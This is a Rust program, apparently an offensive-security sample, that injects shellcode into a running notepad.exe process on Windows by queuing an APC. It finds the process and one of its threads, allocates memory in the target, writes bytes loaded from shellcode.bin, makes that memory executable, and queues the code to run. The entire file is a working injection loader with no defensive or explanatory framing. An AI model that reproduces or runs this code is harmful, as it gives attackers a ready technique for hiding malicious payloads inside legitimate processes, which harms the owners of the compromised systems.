use std::{mem::transmute, os::raw::c_void, ptr::null_mut};

use windows_sys::{
    Wdk::System::SystemInformation::{NtQuerySystemInformation, SystemProcessInformation},
    Win32::{
        Foundation::{PAPCFUNC, STATUS_INFO_LENGTH_MISMATCH},
        System::{
            Diagnostics::Debug::WriteProcessMemory,
            Memory::{
                MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE, VirtualAllocEx,
                VirtualProtectEx,
            },
            Threading::{
                OpenProcess, OpenThread, PROCESS_QUERY_INFORMATION, PROCESS_VM_OPERATION,
                PROCESS_VM_READ, PROCESS_VM_WRITE, QueueUserAPC, THREAD_SET_CONTEXT,
            },
            WindowsProgramming::{SYSTEM_PROCESS_INFORMATION, SYSTEM_THREAD_INFORMATION},
        },
    },
};

const SHELLCODE: &[u8] = include_bytes!("../shellcode.bin");
const SHELLCODE_SIZE: usize = SHELLCODE.len();

fn find_pid(process_name: &str) -> u32 {
    let mut pid = 0;

    unsafe {
        let mut return_length = 0;
        let mut status =
            NtQuerySystemInformation(SystemProcessInformation, null_mut(), 0, &mut return_length);

        if status != STATUS_INFO_LENGTH_MISMATCH {
            println!("Failed to query system information. Status: {}", status);
            return pid;
        }

        let buffer_size = return_length as usize;
        let mut buffer: Vec<u8> = Vec::with_capacity(buffer_size);

        status = NtQuerySystemInformation(
            SystemProcessInformation,
            buffer.as_mut_ptr() as *mut std::ffi::c_void,
            buffer_size as u32,
            &mut return_length,
        );

        if status != 0 {
            println!("Failed to query system information. Status: {}", status);
            return pid;
        }

        let mut process_info = buffer.as_ptr() as *const SYSTEM_PROCESS_INFORMATION;

        loop {
            if !(*process_info).ImageName.Buffer.is_null()
                && process_name.eq_ignore_ascii_case(
                    &String::from_utf16_lossy(std::slice::from_raw_parts(
                        (*process_info).ImageName.Buffer,
                        (*process_info).ImageName.Length as usize / 2,
                    ))
                    .as_str(),
                )
            {
                pid = (*process_info).UniqueProcessId as u32;
                break;
            }

            if (*process_info).NextEntryOffset == 0 {
                break;
            }

            process_info = (process_info as *const u8).add((*process_info).NextEntryOffset as usize)
                as *const SYSTEM_PROCESS_INFORMATION;
        }
    }
    pid
}

fn find_thread_id(pid: u32) -> u32 {
    let mut thread_id = 0;

    unsafe {
        let mut return_length = 0;
        let mut status =
            NtQuerySystemInformation(SystemProcessInformation, null_mut(), 0, &mut return_length);

        if status != STATUS_INFO_LENGTH_MISMATCH {
            println!("Failed to query system information. Status: {}", status);
            return thread_id;
        }

        let buffer_size = return_length as usize;
        let mut buffer: Vec<u8> = Vec::with_capacity(buffer_size);

        status = NtQuerySystemInformation(
            SystemProcessInformation,
            buffer.as_mut_ptr() as *mut std::ffi::c_void,
            buffer_size as u32,
            &mut return_length,
        );

        if status != 0 {
            println!("Failed to query system information. Status: {}", status);
            return thread_id;
        }

        let mut process_info = buffer.as_ptr() as *const SYSTEM_PROCESS_INFORMATION;

        loop {
            if (*process_info).UniqueProcessId as u32 == pid {
                println!("[+] Found {} Threads", (*process_info).NumberOfThreads);

                let offset = (process_info as usize) - (buffer.as_ptr() as usize);

                let thread_offset = offset + size_of::<SYSTEM_PROCESS_INFORMATION>();
                let thread_info_ptr =
                    (buffer.as_ptr()).add(thread_offset) as *const SYSTEM_THREAD_INFORMATION;

                for i in 0..(*process_info).NumberOfThreads {
                    let thread_info = thread_info_ptr.add(i as usize);
                    thread_id = (*thread_info).ClientId.UniqueThread as u32;
                    // println!("[+] Thread ID: {}", thread_id);
                    break;
                }
            }

            if (*process_info).NextEntryOffset == 0 {
                break;
            }

            process_info = (process_info as *const u8).add((*process_info).NextEntryOffset as usize)
                as *const SYSTEM_PROCESS_INFORMATION;
        }
    }
    thread_id
}

fn main() {
    let process_name = "notepad.exe";

    let pid = find_pid(process_name);

    if pid == 0 {
        println!("[-] Failed to find process ID for {}", process_name);
        return;
    }

    println!("[+] Found process ID: {}", pid);

    let thread_id = find_thread_id(pid);
    if thread_id == 0 {
        println!("No thread found for process '{}'.", process_name);
        return;
    }
    println!("[+] Found thread ID: {}", thread_id);

    unsafe {
        let process_handle = OpenProcess(
            PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION,
            0,
            pid,
        );

        if process_handle.is_null() {
            println!("[-] Failed to open process.");
            return;
        }

        let remote_buffer = VirtualAllocEx(
            process_handle,
            null_mut(),
            SHELLCODE_SIZE,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );

        if remote_buffer.is_null() {
            println!("[-] Failed to allocate memory in the target process.");
            return;
        }

        println!(
            "[+] Allocated {} bytes at {:?}",
            SHELLCODE_SIZE, remote_buffer
        );

        let mut bytes_written = 0;
        if WriteProcessMemory(
            process_handle,
            remote_buffer,
            SHELLCODE.as_ptr() as *const c_void,
            SHELLCODE_SIZE,
            &mut bytes_written,
        ) == 0
        {
            println!("[-] Failed to write shellcode to the target process.",);
            return;
        }

        println!(
            "[+] Written {} bytes at {}",
            bytes_written, remote_buffer as usize
        );

        let mut old_protect = 0;
        if VirtualProtectEx(
            process_handle,
            remote_buffer,
            SHELLCODE_SIZE,
            PAGE_EXECUTE_READ,
            &mut old_protect,
        ) == 0
        {
            println!("[-] Failed to change memory protection.");
            return;
        }

        let thread_handle = OpenThread(THREAD_SET_CONTEXT, 0, thread_id);

        if thread_handle.is_null() {
            println!("Failed to open thread.");
            return;
        }

        let shellcode: PAPCFUNC = Some(transmute(remote_buffer));

        if QueueUserAPC(shellcode, thread_handle, 0) == 0 {
            println!("Failed to queue APC.");
            return;
        }

        println!("[+] Queued APC to thread ID: {}", thread_id);
    }
}
